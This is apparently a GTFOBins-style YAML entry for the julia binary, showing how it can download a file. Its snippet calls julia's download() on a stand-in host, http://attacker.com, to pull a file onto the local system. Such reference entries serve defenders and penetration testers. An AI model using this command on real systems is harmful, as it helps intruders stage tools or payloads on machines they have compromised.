---
functions:
  file-download:
    - code: |
        export URL=http://attacker.com/file_to_get
        export LFILE=file_to_save
        julia -e 'download(ENV["URL"], ENV["LFILE"])'
---
